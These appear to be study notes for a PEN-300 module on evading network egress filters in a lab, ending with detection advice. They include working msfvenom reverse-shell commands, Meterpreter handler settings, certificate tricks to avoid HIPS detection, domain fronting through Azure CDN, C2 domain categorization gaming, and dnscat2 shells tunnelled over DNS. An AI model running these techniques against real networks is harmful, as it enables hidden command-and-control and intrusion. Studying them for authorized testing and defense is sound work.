PEN-300 Module 13 — Bypassing Network Filters

Objective

Understand the enterprise Internet Edge egress stack (DNS filters, web proxies, IDS/IPS, SSL inspection, full packet capture) and practice normalization + bypass techniques so C2 traffic "hides within the noise": domain/category hygiene, proxy-aware payloads, certificate customization, domain fronting, and DNS tunneling.

Target surface

  • Lab: Windows 10 client (RDP forwarded through the Ubuntu edge box on TCP/3389) behind an Ubuntu edge machine that runs DNS (dnsmasq), Nginx, and Snort (custom drop rules, most defaults disabled).
  • Kali attack box: 192.168.119.120. Ubuntu edge/DNS: 172.16.51.21. Windows client: 192.168.120.21 (and 192.168.120.45/46 variants seen in listings).
  • Convention: connect to reverse shells by domain name only — direct-to-IP is anomalous and inflexible.

Techniques

1. Recon the filter stack yourself

  • DNS filters compare requested domains against blocklists (e.g. malwaredomainlist) or category databases; blocked queries are dropped or sinkholed. Demo: www.internetbadguys.com resolves to a real IP via Google DNS (8.8.8.8 → 67.215.92.210) but to an OpenDNS sinkhole (208.67.222.222 → 146.112.61.108) that serves a "Phishing threat" block page (OpenDNS/Cisco Umbrella).
  • Reputation lookups (IPVoid, VirusTotal) aggregate multiple providers; NLP-based filters also judge the domain name itself.
  • Web proxies MITM HTTP(S): URL/IP/category filtering, header inspection/modification (User-Agent etc.), full request logging into the SIEM. IDS (passive, alerts) vs IPS (inline, blocks) both do deep packet inspection after reassembling fragmented IP traffic; signatures are narrowly tuned — small pattern changes evade them.

2. Domain and IP hygiene (pre-engagement)

  • Avoid "Newly Seen Domain" categorization: register domains well in advance, generate lookups/traffic early, keep spares to swap mid-engagement.
  • Pre-populate benign content (e.g. cooking blog) and submit/request categorization via OpenDNS tagging so the domain lands in an allowed category (avoid webmail, etc.). Verify with Symantec Bluecoat/Checkpoint categorization lookups too.
  • Typo-squatting (examp1e.com-style) is an option but is itself monitored. Check the C2 IP reputation (shared hosts get flagged for a neighbor's sins) via VirusTotal/IPVoid.

3. Payload and proxy normalization

  • Meterpreter's HTTP/S payload is proxy-aware via InternetSetOptionA — prefer payloads that honor local proxy settings.
  • Conform to HTTP standards (Windows APIs like HttpOpenRequestA do this naturally) and set HttpUserAgent to a browser/OS combo the org actually uses (sniff it, social-engineer it, or build one at useragentstring.com).

4. Signature evasion — case study: Norton/Symantec HIPS

  • Norton 360 HIPS flags the standard Meterpreter HTTPS certificate. Meterpreter already randomizes the cert, but the randomization itself is signatured.
  • Fix: generate a custom self-signed cert with controlled field data: kali@kali:~$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key kali@kali:~$ cat priv.key cert.crt > nasa.pem Set CipherString=DEFAULT (drop @SECLEVEL=2) in /etc/ssl/openssl.cnf, then in multi/handler: set HandlerSSLCert /home/kali/self_cert/nasa.pem. Result: the browser still warns (self-signed) but Norton IPS no longer flags it.
  • Alternatives: Metasploit impersonate_ssl (clone a real site's cert metadata) or a genuine Let's Encrypt cert if you own a clean domain.
  • Full packet capture devices (Netwitness, Moloch) can't block — goal is a low profile; sanity-check tool traffic in Wireshark and mind C2 geolocation.

5. HTTPS inspection

  • Assume inspection if TLS is being decrypted org-wide (org CA impersonates sites). No general bypass; options:
  • TLS certificate pinning in Meterpreter: StagerVerifySSLCert true + HandlerSSLCert <pem> — payload aborts if the presented cert hash mismatches.
  • Categorize your domain into a privacy-sensitive category (e.g. "banking") that inspection devices typically exempt.

6. Domain fronting (Azure CDN demo)

  • Concept: TLS SNI and the HTTP Host header are handled independently. Point SNI at an allowed domain, put your CDN endpoint in the Host header; the CDN routes to your origin. DNS + SNI + cert all show the front domain.
  • Azure setup: CDN profile (Standard Verizon tier most reliable; Standard Microsoft breaks TLS/caching), Custom origin = your C2 domain (e.g. meterpreter.info @ 138.68.99.177), endpoint <name>.azureedge.net. Disable caching: Caching behavior "Bypass cache" + "Bypass caching for query strings" (reverse shells aren't static). ~90 min to provision, ~30 min for settings to propagate.
  • Test the origin with plain python3 -m http.server 80 / an ssl-wrapped SimpleHTTPRequestHandler on 443, then curl / curl -k through the endpoint.
  • Find frontable domains with FindFrontableDomains (rvrsh3ll): kali@kali:~$ python3 FindFrontableDomains.py --domain skype.com Azure Frontable domain found: do.skype.com skype-do.azureedge.net. Verify: curl --header "Host: offensive-security.azureedge.net" https://do.skype.com. Wireshark shows DNS for do.skype.com, its CNAME (→ 152.199.19.161), and Microsoft's SAN cert (valid for 99 domains) — Google/Amazon CDNs reject SNI/Host mismatches; Azure (at course time) did not.
  • Payload (staged HTTP example): kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
  • Handler for staged payloads must force the second stage back through the front domain: set OverrideLHOST do.skype.com, set OverrideRequestHost true (plus set HttpHostHeader ...). The "failed to bind to 152.199.19.161" error is expected — Metasploit fails over to 0.0.0.0. Stageless payloads (used below) don't need the Override options.

7. Domain fronting in the lab (emulated CDN)

  • Lab emulates a CDN with dnsmasq + Nginx on 172.16.51.21. /etc/hosts: 172.16.51.21 good.com, 192.168.119.120 bad.com (points at Kali), 172.16.51.21 cdn123.offseccdn.com. Nginx vhost for cdn123.offseccdn.com does proxy_pass https://bad.com with proxy_ssl_verify off.
  • Snort drops bad.com DNS queries: drop udp any any -> any 53 ... content:"|03|bad|03|com" ... — the |NN| prefixes are length-prefixed FQDN labels (|06|google|03|com for google.com).
  • Stageless payload + handler: kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
  • Verify in Wireshark (filter !(tcp.port == 3389)): DNS resolves good.com, TLS Client Hello SNI requests good.com's cert, Server Hello serves good.com's cert — all while the shell lands via the Host-header-routed path.

8. DNS tunneling with dnscat2

  • Prereq: register a domain and set its NS record to your tunnel server so all subdomain queries reach you. Client data rides in subdomain labels (≤63 chars each, FQDN ≤253), server replies ride in record data (A = 4 bytes; TXT up to 64k); clients poll — the server can't initiate. Data is hex-encoded (e.g. 617265... = "aretherenewcommands").
  • Lab: dnsmasq forwards the tunnel domain to Kali — /etc/dnsmasq.conf: server=/tunnel.com/192.168.119.120 server=/somedomain.com/192.168.119.120 then sudo systemctl restart dnsmasq.
  • Server: kali@kali:~$ dnscat2-server tunnel.com (connections encrypted by default; a pre-shared key can be set — the auto-generated secret in the course listing is [REDACTED]).
  • Client (Windows): dnscat2-v0.07-client-win32.exe tunnel.com — compare the "short authentication string" (displayed on both ends) to detect MITM.
  • Interactive: session -i 1 → shell → session -i 2 for a cmd session; TCP tunneling e.g. listen 127.0.0.1:3389 172.16.51.21:3389 to RDP over DNS (slow but functional).
  • Wireshark shows long, high-entropy subdomains — anomalous, but far less anomalous than a raw command shell.

Detection & defense

  • Sinkhole/blocklist DNS + category enforcement catch lazy domains; category services are the first thing a tester games — audit your categorization.
  • Proxy logs (Host, URL, User-Agent) are high-signal: alert on non-standard user agents, direct-to-IP HTTP, and protocol deviations (the Cobalt Strike extraneous-space HTTP fingerprint is the canonical example).
  • IDS/IPS signatures are brittle — rotate tooling patterns, but defenders should too (Didier Stevens' 2015 Meterpreter POST-URI rule is the template).
  • Domain fronting breaks granular CDN filtering; modern CDNs (Google/Amazon, and eventually Azure) reject SNI/Host mismatches — verify what your CDN provider currently allows.
  • DNS tunneling is slow but slips most egress controls: monitor DNS for long/label-heavy subdomains, NXDOMAIN bursts, and unusual per-client query volume; restrict which resolvers clients may use.
